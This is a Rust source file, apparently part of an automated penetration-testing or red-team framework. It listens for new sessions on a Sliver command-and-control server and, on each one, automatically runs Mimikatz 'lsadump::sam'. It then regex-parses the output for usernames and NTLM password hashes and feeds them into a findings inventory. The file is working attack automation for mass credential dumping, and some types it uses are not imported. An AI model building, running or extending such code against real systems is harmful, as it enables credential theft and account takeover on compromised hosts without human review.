use crate::core::c2::sliver_proto::sliver::rpc::sliver_rpc_client::SliverRpcClient;
use crate::core::c2::sliver_proto::sliver::rpc::EventsRequest;
use crate::core::swarm::inventory::SwarmInventory;
use std::sync::Arc;
use tracing::{info, warn, error};
use tokio_stream::StreamExt;

pub struct SliverFeedbackLoop {
    server_addr: String,
    inventory: Arc<SwarmInventory>,
}

impl SliverFeedbackLoop {
    pub fn new(server_addr: String, inventory: Arc<SwarmInventory>) -> Self {
        Self {
            server_addr,
            inventory,
        }
    }

    /// Start the background feedback loop to monitor new Sliver sessions.
    pub async fn run(self) -> anyhow::Result<()> {
        info!("SliverFeedbackLoop: connecting to Sliver Server at {}", self.server_addr);
        
        // Note: In production, mTLS configuration via Tonic is required here.
        // For MVP, we assume a pre-established or proxied connection.
        let mut client = SliverRpcClient::connect(self.server_addr.clone()).await?;
        
        info!("SliverFeedbackLoop: successfully connected. Subscribing to events...");

        let request = tonic::Request::new(EventsRequest::default());
        let mut stream = client.events(request).await?.into_inner();

        while let Some(event_res) = stream.next().await {
            match event_res {
                Ok(event) => {
                    // Sliver Event contains an enum of possible event types.
                    // We look for SessionOpened.
                    if let Some(session) = event.session {
                        info!("🎯 SliverFeedbackLoop: New Session Opened! ID: {} Host: {}", session.id, session.hostname);
                        
                        // Phase 5.5: Automatically trigger Mimikatz/Lsadump
                        let inventory_clone = self.inventory.clone();
                        let mut client_clone = client.clone();
                        let session_id = session.id.clone();
                        
                        tokio::spawn(async move {
                            if let Err(e) = Self::handle_new_session(client_clone, session_id, inventory_clone).await {
                                error!("SliverFeedbackLoop: failed to handle session: {}", e);
                            }
                        });
                    }
                }
                Err(e) => {
                    warn!("SliverFeedbackLoop: event stream error: {}", e);
                    break;
                }
            }
        }

        Ok(())
    }

    async fn handle_new_session(
        mut client: SliverRpcClient<tonic::transport::Channel>,
        session_id: String,
        inventory: Arc<SwarmInventory>
    ) -> anyhow::Result<()> {
        info!("SliverFeedbackLoop: executing automated lsadump for session {}", session_id);
        
        use crate::core::c2::sliver_proto::sliver::rpc::MimikatzRequest;
        
        // 1. Invoke Mimikatz (lsadump::sam or lsadump::secrets)
        let request = tonic::Request::new(MimikatzRequest {
            session_id: session_id.clone(),
            args: vec!["lsadump::sam".to_string()],
            ..Default::default()
        });

        let response = client.invoke_mimikatz(request).await?.into_inner();
        let output = response.output;

        info!("SliverFeedbackLoop: Mimikatz execution completed for {}. Parsing results...", session_id);

        // 2. Parse NTLM hashes (Regex for Username : ... and Hash : ...)
        // Standard Mimikatz SAM output format:
        // User : <user>
        // Hash NTLM: <hash>
        let user_re = regex::Regex::new(r"User\s+:\s+(.+)").unwrap();
        let ntlm_re = regex::Regex::new(r"Hash NTLM:\s+([a-fA-F0-9]{32})").unwrap();

        let mut current_user = String::new();
        for line in output.lines() {
            if let Some(caps) = user_re.captures(line) {
                current_user = caps.get(1).map(|m| m.as_str().trim()).unwrap_or_default().to_string();
            } else if let Some(caps) = ntlm_re.captures(line) {
                let hash = caps.get(1).map(|m| m.as_str()).unwrap_or_default();
                if !current_user.is_empty() && !hash.is_empty() {
                    info!("🔱 SliverFeedbackLoop: Extracted new credential {} : {}", current_user, hash);
                    
                    // 3. Ingest back to SwarmInventory
                    // Note: In a real scenario, we'd inherit the scope_id from the original target.
                    // For now, we use a placeholder or look up session metadata.
                    let mut f = Finding::new(
                        crate::models::constants::FINDING_NTLM_HASH_CAPTURED,
                        Category::CredentialLeak,
                        Severity::High,
                        &format!("NTLM hash for {} recovered via automated Mimikatz on session {}.", current_user, session_id),
                        serde_json::json!({
                            "username": current_user,
                            "hash": hash,
                            "ntlm": hash,
                            "user": current_user,
                            "source": format!("sliver:{}", session_id)
                        })
                    );
                    // Critical: Inherit or detect scope_id
                    f.core.scope_id = "Auto-Inferred".to_string(); 

                    inventory.ingest_finding(f, crate::core::swarm::inventory::TrustLevel::Private);
                }
            }
        }

        Ok(())
    }
}
